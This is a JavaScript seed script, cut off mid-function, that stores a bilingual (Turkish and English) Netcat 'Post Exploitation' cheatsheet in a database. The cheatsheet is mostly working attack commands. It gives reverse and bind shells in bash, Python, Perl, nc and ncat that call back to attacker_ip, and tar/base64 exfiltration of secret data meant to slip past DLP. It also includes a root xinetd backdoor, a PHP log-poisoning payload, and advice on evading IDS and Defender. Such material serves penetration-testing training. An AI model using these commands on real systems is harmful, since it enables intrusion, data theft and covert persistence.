import dbConnect from '../lib/dbConnect.js';
import Cheatsheet from '../models/Cheatsheet.js';
import Category from '../models/Category.js';
import mongoose from 'mongoose';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const envPath = path.join(__dirname, '..', '.env.local');
if (fs.existsSync(envPath)) {
    const lines = fs.readFileSync(envPath, 'utf-8').split(/\r?\n/);
    for (const line of lines) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('#')) continue;
        const idx = trimmed.indexOf('=');
        if (idx === -1) continue;
        const key = trimmed.slice(0, idx).trim();
        const val = trimmed.slice(idx + 1).trim();
        if (key && !(key in process.env)) process.env[key] = val;
    }
}

const contentTR = `# Netcat (nc) - TCP/IP Swiss Army Knife

## 1. Araç Tanımı
**Netcat (nc)**, ağ bağlantıları oluşturmak, port dinlemek, veri aktarmak ve shell almak için kullanılan çok yönlü bir araçtır. "TCP/IP Swiss Army Knife" olarak bilinir. Red team operasyonlarında reverse shell, bind shell, pivoting, port forwarding ve file exfiltration süreçlerinde kritik rol oynar.

## 2. Kurulum
*   **Linux**: \`apt install netcat\` veya \`apt install ncat\`
*   **Windows**: Ncat (Nmap suite ile gelir) veya standalone nc.exe
*   **Varyasyonlar**: netcat-traditional, netcat-openbsd, ncat (Nmap'in gelişmiş versiyonu)

## 3. Temel Kullanım

### Basit Bağlantı Oluşturma
Hedef sistemin belirli bir portuna TCP bağlantısı başlatır. Telnet benzeri bir etkileşim sağlar.
\`\`\`bash
nc -v target.com 80
\`\`\`
**Argüman Açıklamaları:**
*   **-v**: Verbose mode (bağlantı durumunu gösterir).
*   **target.com**: Hedef IP veya domain.
*   **80**: Hedef port.

### Port Dinleme
Belirtilen portta gelen bağlantıları bekler (Listener).
\`\`\`bash
nc -lvp 4444
\`\`\`
**Argüman Açıklamaları:**
*   **-l**: Listen mode (dinleme modu).
*   **-v**: Verbose (detaylı çıktı).
*   **-p**: Port numarası belirleme.

### TCP/UDP Modları
Netcat varsayılan olarak TCP kullanır. UDP trafiği için mod değiştirilmelidir.
\`\`\`bash
nc -u -lvp 53
\`\`\`
**Argüman Açıklamaları:**
*   **-u**: UDP mode (varsayılan TCP yerine UDP kullanır).
*   **-l**: Listen mode.
*   **-v**: Verbose.
*   **-p**: Port 53 (DNS simülasyonu için sık kullanılır).

### File Transfer
Ağ üzerinden dosya gönderme ve alma işlemi.
**Alıcı (Receiver):**
\`\`\`bash
nc -lvp 5555 > gelen_dosya.zip
\`\`\`
**Gönderen (Sender):**
\`\`\`bash
nc target_ip 5555 < gonderilecek_dosya.zip
\`\`\`
**Argüman Açıklamaları:**
*   **>**: Standart çıktıyı dosyaya yönlendirir (Write).
*   **<**: Dosya içeriğini standart girdiye yönlendirir (Read).

### Banner Grabbing
Servis versiyon bilgisini (Banner) elde etmek için kullanılır.
\`\`\`bash
nc -v target.com 22
\`\`\`
**Argüman Açıklamaları:**
*   **-v**: Bağlantı kurulduğunda servisin gönderdiği ilk veriyi (banner) ekrana basar.

### Port Scanning
Netcat basit bir port tarayıcı olarak kullanılabilir.
\`\`\`bash
nc -zv target.com 20-80
\`\`\`
**Argüman Açıklamaları:**
*   **-z**: Zero-I/O mode (veri göndermeden sadece bağlantı durumunu kontrol eder).
*   **-v**: Açık portları raporlar.
*   **20-80**: Taranacak port aralığı.

### Reverse Shell Mantığı
Hedef makine (victim), saldırganın makinesine (attacker) bağlanır. Firewall'ların inbound kısıtlamalarını aşmak için kullanılır.
**Saldırgan (Listener):**
\`\`\`bash
nc -lvp 4444
\`\`\`
**Hedef (Client):**
\`\`\`bash
nc attacker_ip 4444 -e /bin/bash
\`\`\`
**Argüman Açıklamaları:**
*   **-e**: Bağlantı kurulduktan sonra çalıştırılacak program (exec).

### Bind Shell Mantığı
Hedef makine bir port açar ve dinler. Saldırgan bu porta bağlanır.
**Hedef (Listener):**
\`\`\`bash
nc -lvp 5555 -e /bin/bash
\`\`\`
**Saldırgan (Client):**
\`\`\`bash
nc target_ip 5555
\`\`\`

## 4. İleri Seviye Kullanım

### Reverse Shell Varyasyonları
Farklı diller ve araçlar kullanılarak oluşturulan reverse shell teknikleri.
\`\`\`bash
# Bash TCP
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'

# Perl
perl -e 'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
\`\`\`

### Bind Shell Bypass Teknikleri
Firewall engellemelerini aşmak için alternatif portlar veya protokoller kullanma.
\`\`\`bash
# Named Pipe ile (-e flag olmayan durumlarda)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp 4444 >/tmp/f
\`\`\`

### TLS/SSL Üzerinden nc (ncat)
Trafiği şifreleyerek IDS/IPS sistemlerini atlatma.
**Listener:**
\`\`\`bash
ncat --ssl -lvp 4444
\`\`\`
**Client:**
\`\`\`bash
ncat --ssl target_ip 4444 -e /bin/bash
\`\`\`

### Pipe Yönlendirme (tee, bash, /dev/tcp)
Netcat çıktısını başka araçlara veya dosyalara yönlendirme.
\`\`\`bash
nc -l -p 8080 | tee capture.log | nc target_server 80
\`\`\`

### Proxy ve SOCKS Üzerinden nc
Bağlantıyı proxy zinciri üzerinden geçirerek gizlilik sağlama.
\`\`\`bash
ncat --proxy proxy_ip:8080 --proxy-type http target_ip 4444
ncat --proxy socks_ip:1080 --proxy-type socks5 target_ip 4444
\`\`\`

### Persistent Shell Oluşturma
Bağlantı kopsa bile shell'in tekrar çalışmasını sağlama.
\`\`\`bash
while true; do nc -lvp 4444 -e /bin/bash; done
\`\`\`

### nc → tar → zcat ile File Exfiltration
Büyük dizinleri sıkıştırarak ve şifreleyerek kaçırma.
**Alıcı:**
\`\`\`bash
nc -lvp 5555 | tar zxvf -
\`\`\`
**Gönderen:**
\`\`\`bash
tar zcvf - /var/www/html | nc attacker_ip 5555
\`\`\`

### HTTP Request Forging
Manuel HTTP istekleri oluşturma.
\`\`\`bash
echo -e "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
\`\`\`

### Banner Spoofing
Kendi servis banner'ını değiştirerek saldırganı yanıltma.
\`\`\`bash
echo "SSH-2.0-OpenSSH_8.2p1" | nc -lvp 22
\`\`\`

### Full-Duplex Shell Stabilizasyonu
Reverse shell aldıktan sonra tam interaktif terminale geçiş.
\`\`\`bash
python -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
\`\`\`

### PTY Allocation Teknikleri
Pseudo-terminal oluşturarak sudo vb. komutları çalıştırma.
\`\`\`bash
/usr/bin/script -qc /bin/bash /dev/null
\`\`\`

### Windows ↔ Linux Cross-Platform Shell
Windows ve Linux arasında uyumlu shell bağlantıları.
**Windows Hedef:**
\`\`\`cmd
nc.exe attacker_ip 4444 -e cmd.exe
\`\`\`
**Linux Saldırgan:**
\`\`\`bash
nc -lvp 4444
\`\`\`

### Netcat ile Pivoting
Bir makine üzerinden diğer ağlara erişim sağlama (Relay).
\`\`\`bash
# Pivot Makinesi
mknod backpipe p
nc -l -p 8080 0<backpipe | nc internal_ip 80 1>backpipe
\`\`\`

### Netcat ile Port Forwarding
Lokal portu uzak bir porta yönlendirme.
\`\`\`bash
nc -l -p 8080 -c "nc target_ip 80"
\`\`\`

### Firewall Egress Bypass Teknikleri
Dışarıya çıkışına izin verilen yaygın portları (80, 443, 53) kullanma.
\`\`\`bash
nc -lvp 443
\`\`\`

### Outbound-only Networklerde nc Kullanımı
Sadece dışarıya bağlantı açılabilen durumlarda reverse shell zorunluluğu.
\`\`\`bash
nc -e /bin/sh attacker_ip 80
\`\`\`

### ICMP / UDP Üzerinden Covert-Channel
TCP engellendiğinde UDP veya ICMP (özelleştirilmiş araçlarla) tünelleme.
\`\`\`bash
nc -u attacker_ip 53
\`\`\`

## 5. Açıklamalı Komutlar (GENİŞ LİSTE)

### Temel Argümanlar

**Komut:**
\`\`\`bash
nc -lvp 4444
\`\`\`
**Açıklama:**
Port 4444 üzerinde gelen bağlantıyı dinler, verbose output üretir.
**Argüman Açıklamaları:**
*   **-l**: Listen mode (dinleme).
*   **-v**: Verbose (detaylı çıktı).
*   **-p**: Port seçimi.

**Komut:**
\`\`\`bash
nc -vv -u -z target.com 1-100
\`\`\`
**Açıklama:**
UDP modunda 1-100 arası portları tarar, çok detaylı çıktı verir.
**Argüman Açıklamaları:**
*   **-vv**: Very verbose.
*   **-u**: UDP mode.
*   **-z**: Scan mode (veri göndermez).

**Komut:**
\`\`\`bash
nc -n -w 2 target.com 80
\`\`\`
**Açıklama:**
DNS çözümlemesi yapmadan, 2 saniye timeout ile bağlanır.
**Argüman Açıklamaları:**
*   **-n**: No DNS resolution (IP adresi gerektirir).
*   **-w 2**: 2 saniye timeout.

### Input / Output & File Transfer

**Komut:**
\`\`\`bash
nc -lvp 4444 -o hex_dump.log
\`\`\`
**Açıklama:**
Trafiği hex dump formatında dosyaya kaydeder.
**Argüman Açıklamaları:**
*   **-o**: Output file (hex dump).

**Komut:**
\`\`\`bash
nc target.com 5555 < payload.bin
\`\`\`
**Açıklama:**
payload.bin dosyasını hedefe gönderir.
**Argüman Açıklamaları:**
*   **<**: Input redirection.

### Protocol & Security (Ncat)

**Komut:**
\`\`\`bash
ncat --ssl --ssl-verify -v target.com 443
\`\`\`
**Açıklama:**
SSL sertifikasını doğrulayarak güvenli bağlantı kurar.
**Argüman Açıklamaları:**
*   **--ssl**: SSL/TLS kullanımı.
*   **--ssl-verify**: Sertifika doğrulama.

**Komut:**
\`\`\`bash
ncat -l -p 4444 --allow 192.168.1.10
\`\`\`
**Açıklama:**
Sadece belirtilen IP'den gelen bağlantıları kabul eder.
**Argüman Açıklamaları:**
*   **--allow**: IP whitelist.

**Komut:**
\`\`\`bash
ncat --proxy 10.10.10.1:8080 --proxy-type http target.com 80
\`\`\`
**Açıklama:**
HTTP proxy üzerinden hedefe bağlanır.
**Argüman Açıklamaları:**
*   **--proxy**: Proxy sunucusu.
*   **--proxy-type**: Proxy tipi (http, socks4, socks5).

### Scanning / Enumeration

**Komut:**
\`\`\`bash
nc -z -v -G 5 target.com 20-100
\`\`\`
**Açıklama:**
Source-routing hop pointer'ı 5 yaparak tarama (eski teknik).
**Argüman Açıklamaları:**
*   **-G**: Source-routing hop pointer.

### Shell Execution

**Komut:**
\`\`\`bash
nc -lvp 4444 -e /bin/bash
\`\`\`
**Açıklama:**
Bağlantı kurulduğunda bash shell çalıştırır.
**Argüman Açıklamaları:**
*   **-e**: Execute program.

**Komut:**
\`\`\`bash
ncat -l -p 4444 -c "bash -i"
\`\`\`
**Açıklama:**
Ncat ile interaktif bash shell çalıştırır.
**Argüman Açıklamaları:**
*   **-c**: Command execution (sh -c gibi).

## 6. Gerçek Pentest Senaryoları

### Reverse Shell Alma
**Linux → Linux:**
\`\`\`bash
# Saldırgan
nc -lvp 4444
# Hedef
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
\`\`\`
**Açıklama:**
Hedef Linux makineden saldırganın Linux makinesine standart bash TCP bağlantısı.

**Windows → Linux:**
\`\`\`cmd
# Hedef (Windows)
nc.exe attacker_ip 4444 -e cmd.exe
\`\`\`
**Açıklama:**
Windows CMD shell'ini Linux dinleyicisine yönlendirir.

### Bind Shell Oluşturma
\`\`\`bash
# Hedef
nc -lvp 5555 -e /bin/bash
# Saldırgan
nc target_ip 5555
\`\`\`
**Açıklama:**
Hedef makinede port açılır, saldırgan bağlanır. NAT arkasındaki hedefler için uygun değildir.

### Firewall Outbound Allow Tek Port Üzerinden Shell
\`\`\`bash
# Saldırgan
nc -lvp 443
# Hedef
nc attacker_ip 443 -e /bin/bash
\`\`\`
**Açıklama:**
Genellikle açık olan 443 (HTTPS) portunu kullanarak firewall'u atlatır.

### File Exfiltration (Chunking, Base64, Tar)
\`\`\`bash
# Hedef
tar cf - /secret_data | base64 | nc attacker_ip 4444
# Saldırgan
nc -lvp 4444 | base64 -d | tar xf -
\`\`\`
**Açıklama:**
Veriyi sıkıştırır, base64 ile encode eder (DLP atlatmak için) ve gönderir.

### Banner Grabbing + Service Fingerprinting
\`\`\`bash
echo "QUIT" | nc -v target.com 80
\`\`\`
**Açıklama:**
Web sunucusuna bağlanıp hemen çıkarak Server header bilgisini yakalar.

### Lateral Movement için Pivoting
\`\`\`bash
# Pivot Host
ncat -l -p 8080 --sh-exec "ncat target_internal 80"
\`\`\`
**Açıklama:**
Pivot makinesi üzerinden iç ağdaki hedefe trafik yönlendirir.

### Proxy Üzerinden Shell Tünelleme
\`\`\`bash
ncat --proxy internal_proxy:8080 --proxy-type http attacker_ip 4444 -e /bin/bash
\`\`\`
**Açıklama:**
Kurumsal proxy sunucusu üzerinden dışarıya reverse shell açar.

### Netcat ile Log Poisoning
\`\`\`bash
nc target.com 80
GET /<?php system($_GET['c']); ?> HTTP/1.1
Host: target.com
\`\`\`
**Açıklama:**
Web sunucu loglarına PHP kodu enjekte eder (LFI ile tetiklemek için).

### UDP Üzerinden Shell Denemeleri
\`\`\`bash
# Saldırgan
nc -u -lvp 53
# Hedef
nc -u attacker_ip 53 -e /bin/bash
\`\`\`
**Açıklama:**
TCP engellendiğinde DNS portu (53 UDP) üzerinden shell dener.

### Persistence için xinetd / systemd + nc
\`\`\`bash
# /etc/xinetd.d/backdoor
service backdoor
{
    socket_type = stream
    protocol = tcp
    wait = no
    user = root
    server = /bin/nc
    server_args = -l -p 9999 -e /bin/bash
    disable = no
}
\`\`\`
**Açıklama:**
Xinetd servisi olarak kalıcı bir backdoor portu açar.

## 8. Best Practices (Uzman Seviye)

*   **Hızlı Manuel Doğrulama**: Otomatize araçlardan önce portun açıklığını doğrulamak için her zaman \`nc -zv\` kullanın.
*   **Timeout Ayarı**: Ağ gecikmelerinde yanlış negatif almamak için \`-w\` parametresini (örn: \`-w 5\`) mutlaka kullanın.
*   **Low-Interaction Shell**: IDS/IPS sistemlerini tetiklememek için shell aldıktan sonra gereksiz komut çalıştırmayın.
*   **TLS (Ncat)**: Mümkünse her zaman \`ncat --ssl\` kullanarak trafiği şifreleyin, bu sayede IDS imzalarını atlatırsınız.
*   **Reverse Shell Stabilizasyonu**: Shell alır almaz \`python -c 'import pty...'\` komut zincirini uygulayarak CTRL+C ile bağlantının kopmasını engelleyin.
*   **TTY Allocation**: Sudo gibi interaktif şifre soran komutlar için mutlaka TTY allocate edin.
*   **Ncat Tercihi**: SSL, Proxy ve IP whitelisting özellikleri gerektiğinde standart nc yerine ncat kullanın.
*   **BusyBox Farkları**: Embedded sistemlerdeki nc'nin kısıtlı özelliklerine (genellikle -e yoktur) hazırlıklı olun.
*   **Windows Varyasyonları**: Windows'ta defender'a yakalanmamak için powercat veya şifreli cryptcat alternatiflerini değerlendirin.

## 9. Sık Yapılan Hatalar

*   **-e Engeli**: OpenBSD netcat versiyonunda \`-e\` parametresini kullanmaya çalışıp hata almak (Named pipe kullanın).
*   **DNS Resolution**: \`-n\` kullanmayı unutup her port taramasında DNS timeout beklemek (Ciddi zaman kaybı).
*   **Yanlış IP**: Reverse shell başlatırken NAT arkasındaki internal IP'yi vermek (Public veya VPN IP kullanılmalı).
*   **UDP Feedback**: UDP taramasında yanıt gelmediğinde portun kapalı olduğunu varsaymak (UDP stateless'tır, açık/filtreli ayrımı zordur).
*   **Egress Kuralları**: Rastgele bir port (örn: 4444) kullanıp firewall'un outbound bloklamasına takılmak (80, 443, 53, 8080 kullanın).
*   **Kısa Timeout**: Yavaş ağlarda timeout süresini çok kısa tutup açık portları kaçırmak.
*   **Windows Sürüm Farkı**: Linux komutlarını (örn: \`ls\`, \`cat\`) Windows shell'inde çalıştırmaya çalışmak (\`dir\`, \`type\` kullanın).
*   **Yanlış Syntax**: Port aralığı verirken \`20-80\` yerine \`20 80\` yazarak sadece iki portu taramak.
*   **Stabilizasyon**: Shell'i stabilize etmeden \`vim\` veya \`top\` gibi araçları açıp shell'i kilitlemek.
`;

const contentEN = `# Netcat (nc) - TCP/IP Swiss Army Knife

## 1. Tool Definition
**Netcat (nc)** is a versatile tool used for creating network connections, listening on ports, transferring data, and obtaining shells. Known as the "TCP/IP Swiss Army Knife," it plays a critical role in red team operations for reverse shells, bind shells, pivoting, port forwarding, and file exfiltration.

## 2. Installation
*   **Linux**: \`apt install netcat\` or \`apt install ncat\`
*   **Windows**: Ncat (comes with Nmap suite) or standalone nc.exe
*   **Variants**: netcat-traditional, netcat-openbsd, ncat (Advanced version from Nmap)

## 3. Basic Usage

### Establishing Simple Connection
Initiates a TCP connection to a specific port on the target system. Provides Telnet-like interaction.
\`\`\`bash
nc -v target.com 80
\`\`\`
**Argument Explanations:**
*   **-v**: Verbose mode (shows connection status).
*   **target.com**: Target IP or domain.
*   **80**: Target port.

### Port Listening
Waits for incoming connections on a specified port (Listener).
\`\`\`bash
nc -lvp 4444
\`\`\`
**Argument Explanations:**
*   **-l**: Listen mode.
*   **-v**: Verbose (detailed output).
*   **-p**: Port number selection.

### TCP/UDP Modes
Netcat uses TCP by default. Mode must be changed for UDP traffic.
\`\`\`bash
nc -u -lvp 53
\`\`\`
**Argument Explanations:**
*   **-u**: UDP mode (uses UDP instead of default TCP).
*   **-l**: Listen mode.
*   **-v**: Verbose.
*   **-p**: Port 53 (commonly used for DNS simulation).

### File Transfer
Sending and receiving files over the network.
**Receiver:**
\`\`\`bash
nc -lvp 5555 > received_file.zip
\`\`\`
**Sender:**
\`\`\`bash
nc target_ip 5555 < file_to_send.zip
\`\`\`
**Argument Explanations:**
*   **>**: Redirects standard output to file (Write).
*   **<**: Redirects file content to standard input (Read).

### Banner Grabbing
Used to obtain service version information (Banner).
\`\`\`bash
nc -v target.com 22
\`\`\`
**Argument Explanations:**
*   **-v**: Prints the first data sent by the service (banner) upon connection.

### Port Scanning
Netcat can be used as a simple port scanner.
\`\`\`bash
nc -zv target.com 20-80
\`\`\`
**Argument Explanations:**
*   **-z**: Zero-I/O mode (checks connection status without sending data).
*   **-v**: Reports open ports.
*   **20-80**: Port range to scan.

### Reverse Shell Logic
The target machine (victim) connects to the attacker's machine. Used to bypass inbound firewall restrictions.
**Attacker (Listener):**
\`\`\`bash
nc -lvp 4444
\`\`\`
**Target (Client):**
\`\`\`bash
nc attacker_ip 4444 -e /bin/bash
\`\`\`
**Argument Explanations:**
*   **-e**: Program to execute after connection is established (exec).

### Bind Shell Logic
The target machine opens a port and listens. The attacker connects to this port.
**Target (Listener):**
\`\`\`bash
nc -lvp 5555 -e /bin/bash
\`\`\`
**Attacker (Client):**
\`\`\`bash
nc target_ip 5555
\`\`\`

## 4. Advanced Usage

### Reverse Shell Variations
Reverse shell techniques using different languages and tools.
\`\`\`bash
# Bash TCP
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'

# Perl
perl -e 'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
\`\`\`

### Bind Shell Bypass Techniques
Using alternative ports or protocols to bypass firewall blocks.
\`\`\`bash
# With Named Pipe (when -e flag is missing)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp 4444 >/tmp/f
\`\`\`

### nc over TLS/SSL (ncat)
Encrypting traffic to bypass IDS/IPS systems.
**Listener:**
\`\`\`bash
ncat --ssl -lvp 4444
\`\`\`
**Client:**
\`\`\`bash
ncat --ssl target_ip 4444 -e /bin/bash
\`\`\`

### Pipe Redirection (tee, bash, /dev/tcp)
Redirecting Netcat output to other tools or files.
\`\`\`bash
nc -l -p 8080 | tee capture.log | nc target_server 80
\`\`\`

### nc over Proxy and SOCKS
Providing anonymity by routing connection through a proxy chain.
\`\`\`bash
ncat --proxy proxy_ip:8080 --proxy-type http target_ip 4444
ncat --proxy socks_ip:1080 --proxy-type socks5 target_ip 4444
\`\`\`

### Creating Persistent Shell
Ensuring the shell restarts even if the connection drops.
\`\`\`bash
while true; do nc -lvp 4444 -e /bin/bash; done
\`\`\`

### File Exfiltration with nc → tar → zcat
Compressing and encrypting large directories for exfiltration.
**Receiver:**
\`\`\`bash
nc -lvp 5555 | tar zxvf -
\`\`\`
**Sender:**
\`\`\`bash
tar zcvf - /var/www/html | nc attacker_ip 5555
\`\`\`

### HTTP Request Forging
Creating manual HTTP requests.
\`\`\`bash
echo -e "GET / HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
\`\`\`

### Banner Spoofing
Misleading attackers by changing your own service banner.
\`\`\`bash
echo "SSH-2.0-OpenSSH_8.2p1" | nc -lvp 22
\`\`\`

### Full-Duplex Shell Stabilization
Switching to a fully interactive terminal after obtaining a reverse shell.
\`\`\`bash
python -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
\`\`\`

### PTY Allocation Techniques
Allocating a pseudo-terminal to run commands like sudo.
\`\`\`bash
/usr/bin/script -qc /bin/bash /dev/null
\`\`\`

### Windows ↔ Linux Cross-Platform Shell
Compatible shell connections between Windows and Linux.
**Windows Target:**
\`\`\`cmd
nc.exe attacker_ip 4444 -e cmd.exe
\`\`\`
**Linux Attacker:**
\`\`\`bash
nc -lvp 4444
\`\`\`

### Pivoting with Netcat
Accessing other networks through a compromised machine (Relay).
\`\`\`bash
# Pivot Machine
mknod backpipe p
nc -l -p 8080 0<backpipe | nc internal_ip 80 1>backpipe
\`\`\`

### Port Forwarding with Netcat
Forwarding a local port to a remote port.
\`\`\`bash
nc -l -p 8080 -c "nc target_ip 80"
\`\`\`

### Firewall Egress Bypass Techniques
Using common ports allowed for outbound traffic (80, 443, 53).
\`\`\`bash
nc -lvp 443
\`\`\`

### nc Usage in Outbound-only Networks
Necessity of reverse shell when only outbound connections are allowed.
\`\`\`bash
nc -e /bin/sh attacker_ip 80
\`\`\`

### Covert-Channel over ICMP / UDP
Tunneling over UDP or ICMP (with specialized tools) when TCP is blocked.
\`\`\`bash
nc -u attacker_ip 53
\`\`\`

## 5. Annotated Commands (EXTENSIVE LIST)

### Basic Arguments

**Command:**
\`\`\`bash
nc -lvp 4444
\`\`\`
**Description:**
Listens for incoming connections on port 4444, produces verbose output.
**Argument Explanations:**
*   **-l**: Listen mode.
*   **-v**: Verbose (detailed output).
*   **-p**: Port selection.

**Command:**
\`\`\`bash
nc -vv -u -z target.com 1-100
\`\`\`
**Description:**
Scans ports 1-100 in UDP mode, gives very detailed output.
**Argument Explanations:**
*   **-vv**: Very verbose.
*   **-u**: UDP mode.
*   **-z**: Scan mode (no data sent).

**Command:**
\`\`\`bash
nc -n -w 2 target.com 80
\`\`\`
**Description:**
Connects without DNS resolution, with a 2-second timeout.
**Argument Explanations:**
*   **-n**: No DNS resolution (requires IP address).
*   **-w 2**: 2-second timeout.

### Input / Output & File Transfer

**Command:**
\`\`\`bash
nc -lvp 4444 -o hex_dump.log
\`\`\`
**Description:**
Logs traffic to a file in hex dump format.
**Argument Explanations:**
*   **-o**: Output file (hex dump).

**Command:**
\`\`\`bash
nc target.com 5555 < payload.bin
\`\`\`
**Description:**
Sends payload.bin file to the target.
**Argument Explanations:**
*   **<**: Input redirection.

### Protocol & Security (Ncat)

**Command:**
\`\`\`bash
ncat --ssl --ssl-verify -v target.com 443
\`\`\`
**Description:**
Establishes a secure connection by verifying the SSL certificate.
**Argument Explanations:**
*   **--ssl**: Use SSL/TLS.
*   **--ssl-verify**: Verify certificate.

**Command:**
\`\`\`bash
ncat -l -p 4444 --allow 192.168.1.10
\`\`\`
**Description:**
Accepts connections only from the specified IP.
**Argument Explanations:**
*   **--allow**: IP whitelist.

**Command:**
\`\`\`bash
ncat --proxy 10.10.10.1:8080 --proxy-type http target.com 80
\`\`\`
**Description:**
Connects to target via HTTP proxy.
**Argument Explanations:**
*   **--proxy**: Proxy server.
*   **--proxy-type**: Proxy type (http, socks4, socks5).

### Scanning / Enumeration

**Command:**
\`\`\`bash
nc -z -v -G 5 target.com 20-100
\`\`\`
**Description:**
Scanning with source-routing hop pointer set to 5 (legacy technique).
**Argument Explanations:**
*   **-G**: Source-routing hop pointer.

### Shell Execution

**Command:**
\`\`\`bash
nc -lvp 4444 -e /bin/bash
\`\`\`
**Description:**
Executes bash shell upon connection.
**Argument Explanations:**
*   **-e**: Execute program.

**Command:**
\`\`\`bash
ncat -l -p 4444 -c "bash -i"
\`\`\`
**Description:**
Executes interactive bash shell with Ncat.
**Argument Explanations:**
*   **-c**: Command execution (like sh -c).

## 6. Real Pentest Scenarios

### Obtaining Reverse Shell
**Linux → Linux:**
\`\`\`bash
# Attacker
nc -lvp 4444
# Target
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
\`\`\`
**Description:**
Standard bash TCP connection from target Linux machine to attacker's Linux machine.

**Windows → Linux:**
\`\`\`cmd
# Target (Windows)
nc.exe attacker_ip 4444 -e cmd.exe
\`\`\`
**Description:**
Redirects Windows CMD shell to Linux listener.

### Creating Bind Shell
\`\`\`bash
# Target
nc -lvp 5555 -e /bin/bash
# Attacker
nc target_ip 5555
\`\`\`
**Description:**
Port opens on target machine, attacker connects. Not suitable for targets behind NAT.

### Shell via Firewall Outbound Allow Single Port
\`\`\`bash
# Attacker
nc -lvp 443
# Target
nc attacker_ip 443 -e /bin/bash
\`\`\`
**Description:**
Bypasses firewall using commonly open port 443 (HTTPS).

### File Exfiltration (Chunking, Base64, Tar)
\`\`\`bash
# Target
tar cf - /secret_data | base64 | nc attacker_ip 4444
# Attacker
nc -lvp 4444 | base64 -d | tar xf -
\`\`\`
**Description:**
Compresses data, encodes with base64 (to bypass DLP), and sends it.

### Banner Grabbing + Service Fingerprinting
\`\`\`bash
echo "QUIT" | nc -v target.com 80
\`\`\`
**Description:**
Connects to web server and exits immediately to capture Server header.

### Pivoting for Lateral Movement
\`\`\`bash
# Pivot Host
ncat -l -p 8080 --sh-exec "ncat target_internal 80"
\`\`\`
**Description:**
Routes traffic to internal network target via pivot machine.

### Shell Tunneling over Proxy
\`\`\`bash
ncat --proxy internal_proxy:8080 --proxy-type http attacker_ip 4444 -e /bin/bash
\`\`\`
**Description:**
Opens reverse shell outbound through corporate proxy server.

### Log Poisoning with Netcat
\`\`\`bash
nc target.com 80
GET /<?php system($_GET['c']); ?> HTTP/1.1
Host: target.com
\`\`\`
**Description:**
Injects PHP code into web server logs (to trigger via LFI).

### Shell Attempts over UDP
\`\`\`bash
# Attacker
nc -u -lvp 53
# Target
nc -u attacker_ip 53 -e /bin/bash
\`\`\`
**Description:**
Tries shell over DNS port (53 UDP) when TCP is blocked.

### Persistence via xinetd / systemd + nc
\`\`\`bash
# /etc/xinetd.d/backdoor
service backdoor
{
    socket_type = stream
    protocol = tcp
    wait = no
    user = root
    server = /bin/nc
    server_args = -l -p 9999 -e /bin/bash
    disable = no
}
\`\`\`
**Description:**
Opens a persistent backdoor port as an Xinetd service.

## 8. Best Practices (Expert Level)

*   **Fast Manual Verification**: Always use \`nc -zv\` to verify port openness before automated tools.
*   **Timeout Setting**: Always use the \`-w\` parameter (e.g., \`-w 5\`) to avoid false negatives due to network delays.
*   **Low-Interaction Shell**: Do not run unnecessary commands after obtaining shell to avoid triggering IDS/IPS systems.
*   **TLS (Ncat)**: Always encrypt traffic using \`ncat --ssl\` if possible to bypass IDS signatures.
*   **Reverse Shell Stabilization**: Apply the \`python -c 'import pty...'\` command chain immediately after getting shell to prevent connection drop on CTRL+C.
*   **TTY Allocation**: Always allocate TTY for interactive commands like sudo that ask for passwords.
*   **Prefer Ncat**: Use ncat instead of standard nc when SSL, Proxy, and IP whitelisting features are needed.
*   **BusyBox Differences**: Be prepared for limited features (usually no -e) of nc on embedded systems.
*   **Windows Variations**: Consider powercat or encrypted cryptcat alternatives on Windows to avoid defender detection.

## 9. Common Mistakes

*   **-e Blocking**: Trying to use \`-e\` parameter on OpenBSD netcat version and getting an error (Use Named pipe).
*   **DNS Resolution**: Forgetting to use \`-n\` and waiting for DNS timeout on every port scan (Serious time loss).
*   **Wrong IP**: Giving internal IP behind NAT when starting reverse shell (Public or VPN IP must be used).
*   **UDP Feedback**: Assuming port is closed when no response is received in UDP scan (UDP is stateless, open/filtered distinction is hard).
*   **Egress Rules**: Using a random port (e.g., 4444) and getting blocked by firewall outbound rules (Use 80, 443, 53, 8080).
*   **Short Timeout**: Setting timeout too short on slow networks and missing open ports.
*   **Windows Version Difference**: Trying to run Linux commands (e.g., \`ls\`, \`cat\`) in Windows shell (Use \`dir\`, \`type\`).
*   **Wrong Syntax**: Typing \`20 80\` instead of \`20-80\` for port range, scanning only two ports.
*   **Stabilization**: Opening tools like \`vim\` or \`top\` without stabilizing the shell, locking the shell.
`;

async function updateNetcat() {
    try {
        await dbConnect();
        console.log('Connected to DB. Updating Netcat cheatsheet with expert content...');

        let category = await Category.findOne({ 'name.en': 'Post Exploitation' });
        if (!category) {
